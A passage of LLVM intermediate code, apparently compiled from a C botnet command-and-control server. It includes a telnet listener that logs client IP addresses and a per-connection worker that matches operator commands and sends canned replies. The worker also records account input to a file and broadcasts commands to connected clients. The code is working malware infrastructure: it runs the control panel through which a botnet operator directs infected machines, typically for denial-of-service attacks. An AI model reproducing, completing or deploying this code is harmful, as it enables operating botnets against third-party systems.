  %881 = icmp eq i64 %880, -1
  br i1 %881, label %882, label %883

882:                                              ; preds = %873
  store i8* null, i8** %2, align 8
  br label %1146

883:                                              ; preds = %873
  br label %884

884:                                              ; preds = %883, %869
  %885 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %886 = call i8* @strstr(i8* %885, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.113, i64 0, i64 0)) #8
  %887 = icmp ne i8* %886, null
  br i1 %887, label %888, label %899

888:                                              ; preds = %884
  %889 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %890 = call i32 (i8*, i8*, ...) @sprintf(i8* %889, i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.114, i64 0, i64 0)) #9
  %891 = load i32, i32* %4, align 4
  %892 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %893 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %894 = call i64 @strlen(i8* %893) #8
  %895 = call i64 @send(i32 %891, i8* %892, i64 %894, i32 16384)
  %896 = icmp eq i64 %895, -1
  br i1 %896, label %897, label %898

897:                                              ; preds = %888
  store i8* null, i8** %2, align 8
  br label %1146

898:                                              ; preds = %888
  br label %899

899:                                              ; preds = %898, %884
  %900 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %901 = call i8* @strstr(i8* %900, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i64 0, i64 0)) #8
  %902 = icmp ne i8* %901, null
  br i1 %902, label %903, label %914

903:                                              ; preds = %899
  %904 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %905 = call i32 (i8*, i8*, ...) @sprintf(i8* %904, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.116, i64 0, i64 0)) #9
  %906 = load i32, i32* %4, align 4
  %907 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %908 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %909 = call i64 @strlen(i8* %908) #8
  %910 = call i64 @send(i32 %906, i8* %907, i64 %909, i32 16384)
  %911 = icmp eq i64 %910, -1
  br i1 %911, label %912, label %913

912:                                              ; preds = %903
  store i8* null, i8** %2, align 8
  br label %1146

913:                                              ; preds = %903
  br label %914

914:                                              ; preds = %913, %899
  %915 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %916 = call i8* @strstr(i8* %915, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.117, i64 0, i64 0)) #8
  %917 = icmp ne i8* %916, null
  br i1 %917, label %918, label %929

918:                                              ; preds = %914
  %919 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %920 = call i32 (i8*, i8*, ...) @sprintf(i8* %919, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.118, i64 0, i64 0)) #9
  %921 = load i32, i32* %4, align 4
  %922 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %923 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %924 = call i64 @strlen(i8* %923) #8
  %925 = call i64 @send(i32 %921, i8* %922, i64 %924, i32 16384)
  %926 = icmp eq i64 %925, -1
  br i1 %926, label %927, label %928

927:                                              ; preds = %918
  store i8* null, i8** %2, align 8
  br label %1146

928:                                              ; preds = %918
  br label %929

929:                                              ; preds = %928, %914
  %930 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %931 = call i8* @strstr(i8* %930, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.119, i64 0, i64 0)) #8
  %932 = icmp ne i8* %931, null
  br i1 %932, label %933, label %944

933:                                              ; preds = %929
  %934 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %935 = call i32 (i8*, i8*, ...) @sprintf(i8* %934, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.120, i64 0, i64 0)) #9
  %936 = load i32, i32* %4, align 4
  %937 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %938 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %939 = call i64 @strlen(i8* %938) #8
  %940 = call i64 @send(i32 %936, i8* %937, i64 %939, i32 16384)
  %941 = icmp eq i64 %940, -1
  br i1 %941, label %942, label %943

942:                                              ; preds = %933
  store i8* null, i8** %2, align 8
  br label %1146

943:                                              ; preds = %933
  br label %944

944:                                              ; preds = %943, %929
  %945 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %946 = call i8* @strstr(i8* %945, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i64 0, i64 0)) #8
  %947 = icmp ne i8* %946, null
  br i1 %947, label %948, label %959

948:                                              ; preds = %944
  %949 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %950 = call i32 (i8*, i8*, ...) @sprintf(i8* %949, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.122, i64 0, i64 0)) #9
  %951 = load i32, i32* %4, align 4
  %952 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %953 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %954 = call i64 @strlen(i8* %953) #8
  %955 = call i64 @send(i32 %951, i8* %952, i64 %954, i32 16384)
  %956 = icmp eq i64 %955, -1
  br i1 %956, label %957, label %958

957:                                              ; preds = %948
  store i8* null, i8** %2, align 8
  br label %1146

958:                                              ; preds = %948
  br label %959

959:                                              ; preds = %958, %944
  %960 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %961 = call i8* @strstr(i8* %960, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.123, i64 0, i64 0)) #8
  %962 = icmp ne i8* %961, null
  br i1 %962, label %963, label %974

963:                                              ; preds = %959
  %964 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %965 = call i32 (i8*, i8*, ...) @sprintf(i8* %964, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.124, i64 0, i64 0)) #9
  %966 = load i32, i32* %4, align 4
  %967 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %968 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %969 = call i64 @strlen(i8* %968) #8
  %970 = call i64 @send(i32 %966, i8* %967, i64 %969, i32 16384)
  %971 = icmp eq i64 %970, -1
  br i1 %971, label %972, label %973

972:                                              ; preds = %963
  store i8* null, i8** %2, align 8
  br label %1146

973:                                              ; preds = %963
  br label %974

974:                                              ; preds = %973, %959
  %975 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %976 = call i8* @strstr(i8* %975, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.125, i64 0, i64 0)) #8
  %977 = icmp ne i8* %976, null
  br i1 %977, label %978, label %989

978:                                              ; preds = %974
  %979 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %980 = call i32 (i8*, i8*, ...) @sprintf(i8* %979, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.126, i64 0, i64 0)) #9
  %981 = load i32, i32* %4, align 4
  %982 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %983 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %984 = call i64 @strlen(i8* %983) #8
  %985 = call i64 @send(i32 %981, i8* %982, i64 %984, i32 16384)
  %986 = icmp eq i64 %985, -1
  br i1 %986, label %987, label %988

987:                                              ; preds = %978
  store i8* null, i8** %2, align 8
  br label %1146

988:                                              ; preds = %978
  br label %989

989:                                              ; preds = %988, %974
  %990 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %991 = call i8* @strstr(i8* %990, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.127, i64 0, i64 0)) #8
  %992 = icmp ne i8* %991, null
  br i1 %992, label %993, label %1004

993:                                              ; preds = %989
  %994 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %995 = call i32 (i8*, i8*, ...) @sprintf(i8* %994, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.128, i64 0, i64 0)) #9
  %996 = load i32, i32* %4, align 4
  %997 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %998 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %999 = call i64 @strlen(i8* %998) #8
  %1000 = call i64 @send(i32 %996, i8* %997, i64 %999, i32 16384)
  %1001 = icmp eq i64 %1000, -1
  br i1 %1001, label %1002, label %1003

1002:                                             ; preds = %993
  store i8* null, i8** %2, align 8
  br label %1146

1003:                                             ; preds = %993
  br label %1004

1004:                                             ; preds = %1003, %989
  %1005 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1006 = call i8* @strstr(i8* %1005, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.129, i64 0, i64 0)) #8
  %1007 = icmp ne i8* %1006, null
  br i1 %1007, label %1008, label %1019

1008:                                             ; preds = %1004
  %1009 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1010 = call i32 (i8*, i8*, ...) @sprintf(i8* %1009, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.130, i64 0, i64 0)) #9
  %1011 = load i32, i32* %4, align 4
  %1012 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1013 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1014 = call i64 @strlen(i8* %1013) #8
  %1015 = call i64 @send(i32 %1011, i8* %1012, i64 %1014, i32 16384)
  %1016 = icmp eq i64 %1015, -1
  br i1 %1016, label %1017, label %1018

1017:                                             ; preds = %1008
  store i8* null, i8** %2, align 8
  br label %1146

1018:                                             ; preds = %1008
  br label %1019

1019:                                             ; preds = %1018, %1004
  %1020 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1021 = call i8* @strstr(i8* %1020, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.131, i64 0, i64 0)) #8
  %1022 = icmp ne i8* %1021, null
  br i1 %1022, label %1023, label %1034

1023:                                             ; preds = %1019
  %1024 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1025 = call i32 (i8*, i8*, ...) @sprintf(i8* %1024, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.132, i64 0, i64 0)) #9
  %1026 = load i32, i32* %4, align 4
  %1027 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1028 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1029 = call i64 @strlen(i8* %1028) #8
  %1030 = call i64 @send(i32 %1026, i8* %1027, i64 %1029, i32 16384)
  %1031 = icmp eq i64 %1030, -1
  br i1 %1031, label %1032, label %1033

1032:                                             ; preds = %1023
  store i8* null, i8** %2, align 8
  br label %1146

1033:                                             ; preds = %1023
  br label %1034

1034:                                             ; preds = %1033, %1019
  %1035 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1036 = call i8* @strstr(i8* %1035, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.133, i64 0, i64 0)) #8
  %1037 = icmp ne i8* %1036, null
  br i1 %1037, label %1038, label %1049

1038:                                             ; preds = %1034
  %1039 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1040 = call i32 (i8*, i8*, ...) @sprintf(i8* %1039, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.134, i64 0, i64 0)) #9
  %1041 = load i32, i32* %4, align 4
  %1042 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1043 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1044 = call i64 @strlen(i8* %1043) #8
  %1045 = call i64 @send(i32 %1041, i8* %1042, i64 %1044, i32 16384)
  %1046 = icmp eq i64 %1045, -1
  br i1 %1046, label %1047, label %1048

1047:                                             ; preds = %1038
  store i8* null, i8** %2, align 8
  br label %1146

1048:                                             ; preds = %1038
  br label %1049

1049:                                             ; preds = %1048, %1034
  %1050 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1051 = call i8* @strstr(i8* %1050, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.135, i64 0, i64 0)) #8
  %1052 = icmp ne i8* %1051, null
  br i1 %1052, label %1053, label %1064

1053:                                             ; preds = %1049
  %1054 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1055 = call i32 (i8*, i8*, ...) @sprintf(i8* %1054, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.136, i64 0, i64 0)) #9
  %1056 = load i32, i32* %4, align 4
  %1057 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1058 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1059 = call i64 @strlen(i8* %1058) #8
  %1060 = call i64 @send(i32 %1056, i8* %1057, i64 %1059, i32 16384)
  %1061 = icmp eq i64 %1060, -1
  br i1 %1061, label %1062, label %1063

1062:                                             ; preds = %1053
  store i8* null, i8** %2, align 8
  br label %1146

1063:                                             ; preds = %1053
  br label %1064

1064:                                             ; preds = %1063, %1049
  %1065 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1066 = call i8* @strstr(i8* %1065, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.137, i64 0, i64 0)) #8
  %1067 = icmp ne i8* %1066, null
  br i1 %1067, label %1080, label %1068

1068:                                             ; preds = %1064
  %1069 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1070 = call i8* @strstr(i8* %1069, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.138, i64 0, i64 0)) #8
  %1071 = icmp ne i8* %1070, null
  br i1 %1071, label %1080, label %1072

1072:                                             ; preds = %1068
  %1073 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1074 = call i8* @strstr(i8* %1073, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.139, i64 0, i64 0)) #8
  %1075 = icmp ne i8* %1074, null
  br i1 %1075, label %1080, label %1076

1076:                                             ; preds = %1072
  %1077 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1078 = call i8* @strstr(i8* %1077, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.140, i64 0, i64 0)) #8
  %1079 = icmp ne i8* %1078, null
  br i1 %1079, label %1080, label %1081

1080:                                             ; preds = %1076, %1072, %1068, %1064
  br label %211

1081:                                             ; preds = %1076
  %1082 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1083 = call i8* @strstr(i8* %1082, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.141, i64 0, i64 0)) #8
  %1084 = icmp ne i8* %1083, null
  br i1 %1084, label %1085, label %1086

1085:                                             ; preds = %1081
  br label %1137

1086:                                             ; preds = %1081
  %1087 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1088 = call i8* @strstr(i8* %1087, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.142, i64 0, i64 0)) #8
  %1089 = icmp ne i8* %1088, null
  br i1 %1089, label %1090, label %1091

1090:                                             ; preds = %1086
  br label %1137

1091:                                             ; preds = %1086
  %1092 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @trim(i8* %1092)
  %1093 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1094 = load i32, i32* %5, align 4
  %1095 = sext i32 %1094 to i64
  %1096 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1095
  %1097 = getelementptr inbounds %struct.account, %struct.account* %1096, i32 0, i32 0
  %1098 = getelementptr inbounds [5000 x i8], [5000 x i8]* %1097, i64 0, i64 0
  %1099 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1100 = call i32 (i8*, i8*, ...) @sprintf(i8* %1093, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.55, i64 0, i64 0), i8* %1098, i8* %1099) #9
  %1101 = load i32, i32* %4, align 4
  %1102 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1103 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1104 = call i64 @strlen(i8* %1103) #8
  %1105 = call i64 @send(i32 %1101, i8* %1102, i64 %1104, i32 16384)
  %1106 = icmp eq i64 %1105, -1
  br i1 %1106, label %1107, label %1108

1107:                                             ; preds = %1091
  br label %1137

1108:                                             ; preds = %1091
  %1109 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1110 = call i64 @strlen(i8* %1109) #8
  %1111 = icmp eq i64 %1110, 0
  br i1 %1111, label %1112, label %1113

1112:                                             ; preds = %1108
  br label %368, !llvm.loop !18

1113:                                             ; preds = %1108
  %1114 = load i32, i32* %5, align 4
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1115
  %1117 = getelementptr inbounds %struct.account, %struct.account* %1116, i32 0, i32 0
  %1118 = getelementptr inbounds [5000 x i8], [5000 x i8]* %1117, i64 0, i64 0
  %1119 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.143, i64 0, i64 0), i8* %1118, i8* %1119)
  %1121 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.29, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i64 0, i64 0))
  store %struct._IO_FILE* %1121, %struct._IO_FILE** %57, align 8
  %1122 = load %struct._IO_FILE*, %struct._IO_FILE** %57, align 8
  %1123 = load i32, i32* %5, align 4
  %1124 = sext i32 %1123 to i64
  %1125 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1124
  %1126 = getelementptr inbounds %struct.account, %struct.account* %1125, i32 0, i32 0
  %1127 = getelementptr inbounds [5000 x i8], [5000 x i8]* %1126, i64 0, i64 0
  %1128 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1129 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1122, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.143, i64 0, i64 0), i8* %1127, i8* %1128)
  %1130 = load %struct._IO_FILE*, %struct._IO_FILE** %57, align 8
  %1131 = call i32 @fclose(%struct._IO_FILE* %1130)
  %1132 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1133 = load i32, i32* %4, align 4
  %1134 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i64 0, i64 0
  call void @broadcast(i8* %1132, i32 %1133, i8* %1134)
  %1135 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %1135, i8 0, i64 2048, i1 false)
  br label %368, !llvm.loop !18

1136:                                             ; preds = %368
  br label %1137

1137:                                             ; preds = %1136, %1107, %1090, %1085, %686, %659, %636, %629, %610, %602, %594, %586, %578, %536, %517, %509, %501, %493, %485, %477, %469, %461, %453, %445, %359, %342, %334, %326, %318, %310, %302, %294, %286, %278, %270, %262, %254, %222, %217, %209, %208, %200, %192, %160, %154, %128, %122, %112
  %1138 = load i32, i32* %4, align 4
  %1139 = sext i32 %1138 to i64
  %1140 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1139
  %1141 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1140, i32 0, i32 1
  store i32 0, i32* %1141, align 4
  %1142 = load i32, i32* %4, align 4
  %1143 = call i32 @close(i32 %1142)
  %1144 = load volatile i32, i32* @managesConnected, align 4
  %1145 = add nsw i32 %1144, -1
  store volatile i32 %1145, i32* @managesConnected, align 4
  br label %1146

1146:                                             ; preds = %1137, %1062, %1047, %1032, %1017, %1002, %987, %972, %957, %942, %927, %912, %897, %882, %855, %790, %752, %737, %722
  %1147 = load i8*, i8** %2, align 8
  ret i8* %1147
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

declare i32 @resolve(...) #1

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct._IO_FILE*, align 8
  %9 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %10 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %10, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %13, label %14

13:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.144, i64 0, i64 0))
  br label %14

14:                                               ; preds = %13, %1
  %15 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %15, i8 0, i64 16, i1 false)
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 0, i32* %18, align 4
  %19 = load i32, i32* %2, align 4
  %20 = trunc i32 %19 to i16
  %21 = call zeroext i16 @htons(i16 zeroext %20) #10
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = load i32, i32* %3, align 4
  %24 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %25 = call i32 @bind(i32 %23, %struct.sockaddr* %24, i32 16) #9
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %28

27:                                               ; preds = %14
  call void @perror(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.145, i64 0, i64 0))
  br label %28

28:                                               ; preds = %27, %14
  %29 = load i32, i32* %3, align 4
  %30 = call i32 @listen(i32 %29, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %31

31:                                               ; preds = %28, %68
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.146, i64 0, i64 0))
  %33 = bitcast %struct.sockaddr_in* %7 to { i64, i64 }*
  %34 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %33, i32 0, i32 0
  %35 = load i64, i64* %34, align 4
  %36 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %33, i32 0, i32 1
  %37 = load i64, i64* %36, align 4
  call void @client_addr(i64 %35, i64 %37)
  %38 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.147, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i64 0, i64 0))
  store %struct._IO_FILE* %38, %struct._IO_FILE** %8, align 8
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %8, align 8
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  %42 = load i32, i32* %41, align 4
  %43 = and i32 %42, 255
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, 65280
  %48 = lshr i32 %47, 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %50 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %49, i32 0, i32 0
  %51 = load i32, i32* %50, align 4
  %52 = and i32 %51, 16711680
  %53 = lshr i32 %52, 16
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  %57 = and i32 %56, -16777216
  %58 = lshr i32 %57, 24
  %59 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %39, i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.148, i64 0, i64 0), i32 %43, i32 %48, i32 %53, i32 %58)
  %60 = load %struct._IO_FILE*, %struct._IO_FILE** %8, align 8
  %61 = call i32 @fclose(%struct._IO_FILE* %60)
  %62 = load i32, i32* %3, align 4
  %63 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %64 = call i32 @accept(i32 %62, %struct.sockaddr* %63, i32* %5)
  store i32 %64, i32* %4, align 4
  %65 = load i32, i32* %4, align 4
  %66 = icmp slt i32 %65, 0
  br i1 %66, label %67, label %68

67:                                               ; preds = %31
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.149, i64 0, i64 0))
  br label %68

68:                                               ; preds = %67, %31
  %69 = load i32, i32* %4, align 4
  %70 = sext i32 %69 to i64
  %71 = inttoptr i64 %70 to i8*
  %72 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %71) #9
  br label %31
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.150, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = load i8**, i8*** %6, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30) #8
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = icmp sgt i32 %32, 1000
  br i1 %33, label %34, label %36

34:                                               ; preds = %23
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.151, i64 0, i64 0))
  ret i32 0

36:                                               ; preds = %23
  %37 = load i32, i32* %9, align 4
  %38 = icmp slt i32 %37, 1000
  br i1 %38, label %39, label %41

39:                                               ; preds = %36
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.34, i64 0, i64 0))
  br label %41

41:                                               ; preds = %39, %36
  br label %42

42:                                               ; preds = %41
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.152, i64 0, i64 0))
  %44 = load i8**, i8*** %6, align 8
